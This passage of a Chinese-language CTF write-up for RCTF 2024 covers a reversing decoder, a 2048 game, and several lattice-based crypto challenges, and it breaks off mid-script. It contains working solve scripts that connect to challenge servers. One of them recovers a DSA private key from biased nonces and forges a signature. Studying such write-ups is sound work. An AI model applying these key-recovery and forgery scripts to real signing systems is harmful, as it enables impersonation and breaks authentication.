class="number">0x000000E5</span>, <span class="number">0x00000011</span>, <span class="number">0x000000A3</span>, <span class="number">0x000000C0</span>, <span class="number">0x00000000</span>]<span class="built_in">print</span>(<span class="built_in">len</span>(enc))</span><br><span class="line">x1 = [<span class="number">0xD8</span>, <span class="number">0x19</span>, <span class="number">0x3A</span>, <span class="number">0x72</span>, <span class="number">0x0A</span>, <span class="number">0xBB</span>, <span class="number">0xDE</span>, <span class="number">0xD8</span>, <span class="number">0xB1</span>, <span class="number">0x24</span>, <span class="number">0x2E</span>, <span class="number">0x1E</span>, <span class="number">0xC9</span>, <span class="number">0xDA</span>, <span class="number">0xA6</span>, <span class="number">0x93</span>, <span class="number">0xF0</span>, <span class="number">0x25</span>, <span class="number">0x56</span>, <span class="number">0xF8</span>, <span class="number">0xF2</span>, <span class="number">0x07</span>, <span class="number">0x36</span>, <span class="number">0x90</span>, <span class="number">0x95</span>]</span><br><span class="line">x2 = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;93939393939393939393939393939393939393939393939393&quot;</span>)</span><br><span class="line">x = [x1[i]^x2[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x1))]<span class="built_in">print</span>(x)</span><br><span class="line">enc = [enc[i]^x[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc))] </span><br><span class="line"><span class="built_in">print</span>(enc)<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    enc[i] = (enc[i]  <span class="number">6</span>) | (enc[i] &lt;&lt; <span class="number">2</span>);</span><br><span class="line">    enc[i] &amp;= <span class="number">0xfff</span><span class="keyword">or</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    enc[i] ^= 0x7Dprint(<span class="built_in">len</span>(enc))<span class="built_in">print</span>(<span class="built_in">bytes</span>(enc))</span><br></pre></td></tr></table></figure>

<h2><span id="2048">2048</span><a href="#2048" class="header-anchor"></a></h2><p>初始10000分，最终要1000000分，每次赢一盘最多加当前的分数</p>
<p>大概玩十几遍2048就可以了（泪目）</p>
<p><img src="../images/2024-05-27-RCTF/968092825888ad31e980ebd3d5450648.png"></p>
<h1><span id="crypto">Crypto</span><a href="#crypto" class="header-anchor"></a></h1><h2><span id="signsystem">SignSystem</span><a href="#signsystem" class="header-anchor"></a></h2><p>$$ \begin{aligned} k \cdot s &amp;&#x3D; hm + x \cdot r \ \text{msb} | k | \text{lsb} &amp;&#x3D; (hm + x \cdot r) \cdot s^{-1} \end{aligned} $$<br>$$<br>\begin{aligned}<br>&amp;\text{msb}: 8\text{-bit}, \quad \text{lsb}: 2\text{-bit} \<br>&amp;x: 160\text{-bit}, \quad k: 150\text{-bit}<br>\end{aligned}<br>$$<br>已知s,r,hm。可爆破msb和lsb，用19组来尝试规约出k。这里由于数据和lsb的位数有关，直接爆破lsb默认为2bit（2，3两个取值）。还有就是当msb为较大的8bit数时概率较高，所以简单做移位，然后原始的格就能出x然后伪造目标签名。</p>
<p>$$ k &#x3D; (hm \cdot s^{-1} - \text{msb} - \text{lsb}) \cdot 4^{-1} + x \cdot r \cdot (4s)^{-1} $$</p>
<p>Exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time : 2024/5/25 15:11</span></span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> getrandbits</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_ephemeral_key</span>(<span class="params">k, lsb, msb</span>):</span><br><span class="line">    <span class="keyword">return</span> msb &lt;&lt; (k + lsb.bit_length()) | getrandbits(k) &lt;&lt; lsb.bit_length() | lsb</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">pubkey, x, msg, lsb, msb</span>):</span><br><span class="line">    p, q, g, y = pubkey</span><br><span class="line">    k = gen_ephemeral_key(<span class="number">150</span>, lsb, msb)</span><br><span class="line">    r = <span class="built_in">pow</span>(g, k, p) % q</span><br><span class="line">    Hm = <span class="built_in">int</span>(sha1(msg).hexdigest(), <span class="number">16</span>)</span><br><span class="line">    s = (Hm + x * r) * inverse(k, q) % q</span><br><span class="line">    <span class="keyword">return</span> (r, s)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    sh = remote(<span class="string">&#x27;121.37.182.7&#x27;</span>,<span class="number">10089</span>)</span><br><span class="line">    line = sh.recvline().strip()[<span class="number">13</span>:]</span><br><span class="line">    pub = <span class="built_in">eval</span>(line)</span><br><span class="line">    p, q, g, y = pub</span><br><span class="line">    GG = GF(p)</span><br><span class="line">    Ms = [<span class="built_in">str</span>(i).encode() <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">19</span>)]</span><br><span class="line">    rr,ss = [],[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">19</span>):</span><br><span class="line">        sh.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">        sh.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">        sh.recvuntil(<span class="string">b&#x27;Which message to sign?: &#x27;</span>)</span><br><span class="line">        sh.sendline(Ms[i])</span><br><span class="line">        r,s = <span class="built_in">eval</span>(sh.recvline().strip()[<span class="number">11</span>:])</span><br><span class="line">        rr.append(r)</span><br><span class="line">        ss.append(s)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> msb <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">192</span>,<span class="number">256</span>):</span><br><span class="line">        <span class="built_in">print</span>(msb)</span><br><span class="line">        <span class="keyword">for</span> lsb <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="number">4</span>):</span><br><span class="line">            A = []</span><br><span class="line">            B = []</span><br><span class="line">            K = (msb&lt;&lt;<span class="number">152</span>)+lsb</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">19</span>):</span><br><span class="line">                Hm = <span class="built_in">int</span>(sha1(Ms[i]).hexdigest(), <span class="number">16</span>)</span><br><span class="line">                A.append(rr[i]*inverse(ss[i],q)*inverse(<span class="number">4</span>,q) %q)</span><br><span class="line">                B.append((Hm*inverse(ss[i],q)- K)*inverse(<span class="number">4</span>,q) %q)</span><br><span class="line">            M = Matrix(QQ,<span class="number">21</span>)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">19</span>):</span><br><span class="line">                M[i,i] = q</span><br><span class="line">                M[-<span class="number">2</span>,i] = A[i]</span><br><span class="line">                M[-<span class="number">1</span>,i] = B[i]</span><br><span class="line">            M[-<span class="number">2</span>,-<span class="number">2</span>] = <span class="number">1</span>/<span class="number">2</span>^<span class="number">10</span></span><br><span class="line">            M[-<span class="number">1</span>,-<span class="number">1</span>] = <span class="number">2</span>^<span class="number">150</span></span><br><span class="line">            res = M.LLL()</span><br><span class="line">            x = <span class="built_in">abs</span>(res[<span class="number">1</span>][-<span class="number">2</span>]*<span class="number">1024</span>)</span><br><span class="line">            <span class="keyword">if</span> y == ZZ(GG(g)^x):</span><br><span class="line">                r,s = sign(pub, x, <span class="string">b&quot;get flag&quot;</span>, lsb, msb)</span><br><span class="line">                sh.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">                sh.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">                sh.recvuntil(<span class="string">b&quot;Which message to verify?: &quot;</span>)</span><br><span class="line">                sh.sendline(<span class="string">b&quot;get flag&quot;</span>)</span><br><span class="line">                sh.recvuntil(<span class="string">b&quot;r:&quot;</span>)</span><br><span class="line">                sh.sendline(<span class="built_in">str</span>(r).encode())</span><br><span class="line">                sh.recvuntil(<span class="string">b&quot;s:&quot;</span>)</span><br><span class="line">                sh.sendline(<span class="built_in">str</span>(s).encode())</span><br><span class="line">                <span class="built_in">print</span>(sh.recv())</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">    sh.close()</span><br></pre></td></tr></table></figure>

<h2><span id="hello-xctf">Hello, XCTF!</span><a href="#hello-xctf" class="header-anchor"></a></h2><p>目标在b’XCTFxctf’组成一个64长度的字符串s，满足s+b’$’%p&#x3D;b’hello’，p为自己设定的100位素数。</p>
<p>$$\sum_{i&#x3D;1}^{64}256^i*s_i&#x3D;hello-$\mod p$$</p>
<p>目标字符串差距过大，考虑使用线性组合优化目标向量。参考NSSCTF-easy_mod</p>
<p>发现仅有Xtf有良好的线性关系（-1，0，1）</p>
<p>考虑爆破不同p来得到一组解</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">M = Matrix(ZZ,<span class="number">14</span>)</span><br><span class="line">p = getPrime(<span class="number">100</span>)</span><br><span class="line">c = <span class="number">448378203211</span> <span class="comment">#hello-$</span></span><br><span class="line">table = [<span class="built_in">ord</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&quot;Xft&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#part1 linear transformation and remove prefix and suffix</span></span><br><span class="line">a = <span class="number">1</span> * inverse(table[<span class="number">0</span>]-table[<span class="number">1</span>],p)</span><br><span class="line">b = (<span class="number">1</span> - a*table[<span class="number">0</span>]) % p</span><br><span class="line">a,b</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    <span class="built_in">print</span>((a*table[i]+b)%p)</span><br><span class="line">c = c * inverse(<span class="number">256</span>,p) % p</span><br><span class="line">c = a*c % p</span><br><span class="line">length = <span class="number">64</span></span><br><span class="line">L = Matrix(ZZ,length+<span class="number">2</span>,length+<span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">    L[i,i] = <span class="number">1</span></span><br><span class="line">    L[i,-<span class="number">1</span>] = <span class="number">256</span>^i</span><br><span class="line">    c += <span class="number">256</span>^i*b</span><br><span class="line">    c %= p</span><br><span class="line"></span><br><span class="line">L[-<span class="number">2</span>,-<span class="number">2</span>] = <span class="number">1</span></span><br><span class="line">L[-<span class="number">2</span>,-<span class="number">1</span>] = -c</span><br><span class="line">L[-<span class="number">1</span>,-<span class="number">1</span>] = p</span><br><span class="line">L[:,-<span class="number">1</span>:] *= p</span><br><span class="line">res = L.BKZ(block_size=<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res[:-<span class="number">1</span>]:</span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> i[:-<span class="number">2</span>][::-<span class="number">1</span>]:</span><br><span class="line">        <span class="keyword">if</span>(j == <span class="number">1</span>):</span><br><span class="line">            flag += <span class="string">&quot;X&quot;</span></span><br><span class="line">        <span class="keyword">elif</span>(j == -<span class="number">1</span>):</span><br><span class="line">            flag += <span class="string">&quot;t&quot;</span></span><br><span class="line">        <span class="keyword">elif</span>(j == <span class="number">0</span>):</span><br><span class="line">            flag += <span class="string">&quot;f&quot;</span></span><br><span class="line">        <span class="keyword">elif</span>(j==<span class="number">2</span>):</span><br><span class="line">            flag += <span class="string">&quot;J&quot;</span></span><br><span class="line">    flag += <span class="string">&quot;$&quot;</span></span><br><span class="line"><span class="comment">#     print(len(flag))</span></span><br><span class="line">    <span class="keyword">if</span>(bytes_to_long(flag.encode()) % p == <span class="number">448378203247</span>):</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># p = 959011088180926180839552561337</span></span><br><span class="line"><span class="comment"># flag = fXXftfffttftXfftfffXtftffXXXfffXttXXffftXftttXfXftfftXttffXffttt$</span></span><br></pre></td></tr></table></figure>

<h2><span id="d3">D³</span><a href="#d3" class="header-anchor"></a></h2><p>简单说题目要求给出三个解密方式都能完成解密。</p>
<p>第一种：标准解密，不用考虑。</p>
<p>第二种：$$d&#x3D;e^k\mod phi,phi&#x3D;(p-1)*(q-1)$$</p>
<p>第三种：$$d&#x3D;e^k\mod phi,phi&#x3D;lcm(p-1,q-1)$$</p>
<p>k为指定的一个数，可在factordb分解成多个素数</p>
<p>这里很显然后两种本质上是一样的，所以题目简化为：</p>
<p>$$m^{e*d}&#x3D;m\mod n\m^{e^{k+1}\mod phi}&#x3D;m\mod n$$</p>
<p>能够满足条件的要求：$$k+1|\phi(phi)$$。k+1的素因子为17个，可以穷举一下组合得到满足条件的phi的素因子。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">proof.<span class="built_in">all</span>(<span class="literal">False</span>) <span class="comment"># speed up primality checking a bit</span></span><br><span class="line"></span><br><span class="line">s=<span class="string">&#x27; 2 · 7 · 9 · 79 · 2731 · 4057 · 8191 · 121369 · 22366891 · 6740339310641 · 10030854869257 · 4929910764223610387 · 4966300248405749059 · 18526238646011086732742614043 · 3340762283952395329506327023033 · 167510000247425697384594847173622455701743569339841261429683667·8342680841093063014359532631803433656669591074421858694040109486076573471951766107416262860801&#x27;</span></span><br><span class="line">factors = [<span class="built_in">eval</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> s.split(<span class="string">&#x27;·&#x27;</span>)]</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> isPrime</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line">C = []</span><br><span class="line"><span class="keyword">for</span> ps <span class="keyword">in</span> powerset(factors):</span><br><span class="line">    v = prod(ps) + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> is_prime(v):</span><br><span class="line">        C.append(prod(ps) + <span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(C)</span><br></pre></td></tr></table></figure>

<p>同理在通过phi的素因子做一个随机组合得到n</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">is_lucky_modulus = <span class="keyword">lambda</span> p, q: p != q <span class="keyword">and</span> is_lucky_prime(p) <span class="keyword">and</span> is_lucky_prime(q)</span><br><span class="line">C = [<span class="number">19</span>, <span class="number">127</span>, xxx]<span class="comment"># 去除2，3.2是一定需要的，3是一定不需要的</span></span><br><span class="line">dit = &#123;&#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(C))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> C:</span><br><span class="line">    <span class="keyword">if</span> i.bit_length() <span class="keyword">in</span> dit:</span><br><span class="line">        dit[i.bit_length()].append(i)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        dit[i.bit_length()] = [i]</span><br><span class="line"><span class="built_in">print</span>(dit)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    temp = random.choices(C,k=random.randint(<span class="number">2</span>,<span class="number">5</span>))</span><br><span class="line">    temp = reduce(<span class="keyword">lambda</span> a, b: a * b, temp)</span><br><span class="line">    <span class="keyword">if</span> temp.bit_length()&gt;<span class="number">1024</span>:<span class="keyword">continue</span></span><br><span class="line">    low,high = (<span class="number">2</span>**<span class="number">1023</span>//temp).bit_length(),(<span class="number">2</span>**<span class="number">1024</span>//temp).bit_length()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(low,high+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> dit:</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> dit[i]:</span><br><span class="line">                temp1 = temp*j</span><br><span class="line">                <span class="keyword">if</span> is_lucky_prime(<span class="number">2</span>*temp1+<span class="number">1</span>):</span><br><span class="line">                    <span class="built_in">print</span>((<span class="number">2</span>*temp1+<span class="number">1</span>))</span><br><span class="line"><span class="comment"># 126366417385482081632125709094422195763085260839280726740164612475634922264215045413877512640959314132187586716879561409141350180398416405619572141421522560637943964009554210789034269798922933667348876400327539861064015972617479878127021685556362985889939708226852813589758433391734452221720317317879861645259</span></span><br><span class="line"><span class="comment"># 151974134283935133352420140651526474538548682010699934815033216140905302768143230133430556352882687267987873313578681017377217259032440048007955628689170671694683741633721001403202878128665495512534319682836729961494276461120603551226499672239779728136264935129191088698434836072763401447684000861562852767379</span></span><br><span class="line"><span class="comment"># 106312089628793849062763337995024706937792152772069990672450023530583677738560813825597909857977982025524197288970637855162732583840554342767800584850797419457546950034663390577782967179012861468463694781815886302442867373996009972323299453999920718059621113399549466447947193549531131615015163546047741227827</span></span><br><span class="line"><span class="comment"># 140646306779911236718100133345672526392582055647788058291509942224041198448052411163408694927566949009305647384291001717328802708260579523859117526078577710848945020201292305928651597199282635108376461842318627821309798059469913133091889616376641944238299416259355290939717393034960368973288667712851402681787</span></span><br></pre></td></tr></table></figure>

<h2><span id="mersenne">Mersenne</span><a href="#mersenne" class="header-anchor"></a></h2><p>随机数生成器函数（random(n,w)）生成的随机数是n比特，汉明权重为w的数。这里w为12，n较大。所以整体随机数汉明权重很小。</p>
<p>$$c&#x3D;t*(a*h+b)\h&#x3D;g^{-1}*f\mod p$$</p>
<p>f,g数较小，可以用$$M&#x3D;\begin{pmatrix}h&amp;1\p&amp;0\end{pmatrix}$$还原g,f。所以改写上述第一个等式$$g<em>c&#x3D;t</em>(a<em>f+b</em>g)\mod p$$.</p>
<p>t为-1，1的待求变量。g,f,a,b均为random生成的低汉明权重随机数。</p>
<p>由于p是梅森素数。所以有$$2^k\mod p&#x3D;2^{k-607};k&gt;607$$。也就是经过mod运算不改变汉明权重。</p>
<p>所以a<em>f，b</em>g不考虑进位的情况下最大均有12*12&#x3D;144个1，做加法最大有288个1。在进位的情况下基本上是230左右的汉明权重。以此判断t。</p>
<p>由于第一步还原g,f有小概率失败，所以先用*占位，所以多得到几次结果，取并集得到flag。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time : 2024/5/26 15:37</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&#x27;123.60.161.30&#x27;</span>,<span class="number">10089</span>)</span><br><span class="line">p = <span class="number">2</span>**<span class="number">607</span> - <span class="number">1</span></span><br><span class="line">res = []</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        c,h = io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>).decode().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        c,h = <span class="built_in">eval</span>(c),<span class="built_in">eval</span>(h)</span><br><span class="line">        M = Matrix(ZZ,[[h,<span class="number">1</span>],[p,<span class="number">0</span>]])</span><br><span class="line">        R = M.LLL()</span><br><span class="line">        f,g = <span class="built_in">abs</span>(R[<span class="number">0</span>][<span class="number">0</span>]),<span class="built_in">abs</span>(R[<span class="number">0</span>][<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">sum</span>([<span class="built_in">int</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">bin</span>(f)[<span class="number">2</span>:]]) == <span class="number">12</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">sum</span>([<span class="built_in">int</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">bin</span>((g*c)%p)[<span class="number">2</span>:]])&lt;<span class="number">260</span>:</span><br><span class="line">                flag += <span class="string">&#x27;0&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                flag += <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag += <span class="string">&#x27;*&#x27;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        io.close()</span><br><span class="line">        <span class="comment"># print(long_to_bytes(int(flag,2)))</span></span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">flag1 = <span class="string">&#x27;010100100100001101010100010001100111101100110010011000110011001001100010011001000011011100110111001*0111001011010011011100110001001100000110011000101101001101000*100010001101000011001100101101011000100011001101100100011000110010110100110000001100000110000101100100011000100110001101100011011001000011100100110011001101110011011101111101&#x27;</span></span><br><span class="line">flag2 = <span class="string">&#x27;01010010010000110101010*0100011*0111101100110010011000110011001001100010011001000011011100*1011100110111001011010*1*01*1001100010011000001100110001011010011010001100010001*01000011001100101*0101100010001100110110*10001*00011001*110*00110000001100000110000101*00*000110001001100011011*0011011001000011100100110011001101110011011101111101&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i,j <span class="keyword">in</span> <span class="built_in">zip</span>(flag2,flag1):</span><br><span class="line">    <span class="keyword">if</span> i!=<span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">        flag += i</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag+=j</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(flag,<span class="number">2</span>)))</span><br></pre></td></tr></table></figure>

<h2><span id="l3">L³</span><a href="#l3" class="header-anchor"></a></h2><p>简单分析题目：</p>
<p>$$ g_i^{\text{otp}} \cdot \text{leak} \equiv g^{sk_1 \cdot es_1 + sk_2 \cdot es_2 + sk_3 \cdot es_3} \pmod{p} $$</p>
<p>$$g_i$$为round_g,g为原始的生成元.$$es_i$$较小。</p>
<p>素数p光滑，dlp问题可解。随机生成一个基元作为新的生成元G</p>
<p>$$G^{s_i*otp+e_i}&#x3D;G^{sk_1^,*es_1+sk_2^,*es_2+sk_3^,*es_3}$$</p>
<p>$$s_i*otp+e_i&#x3D;sk_1^,*es_1+sk_2^,*es_2+sk_3^,*es_3$$</p>
<p>这个等式只有$$s_i,e_i$$已知。考虑正交格，得到向量u。满足$$&#x3D;0,&#x3D;0$$；</p>
<p>同时使得$$&#x3D;0,&#x3D;0,&#x3D;0$$。</p>
<p>即先通过正交格得到u，然后取u的右核矩阵v，在规约一下得到短向量es。</p>
<p>由于es1较大520bit,es2,es3均为512bit。</p>
<p>通过测试矩阵运算v.T*x&#x3D;es，得到$$\begin{pmatrix}i&amp;0&amp;1\j&amp;-1&amp;-1\1&amp;0&amp;0\end{pmatrix}$$，即es2,es3可以直接由v的简单线性组合得到，es1则需要爆破i,j。结果测试两组数据发现i,j均为(-256,256)的范围，可以爆破。</p>
<p>还原otp：</p>
<p>暂令es1&#x3D;v2,es2,es3已知。求解es1,es2,es3三个向量的正交格u1。</p>
<p>得到$$*otp+&#x3D;0\mod (p-1)$$,得到otp。</p>
<p>通过前缀RCTF爆破i,j判断es1向量第32个字节是否与目标相等，来确定i,j。</p>
<p>Exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">p = <span 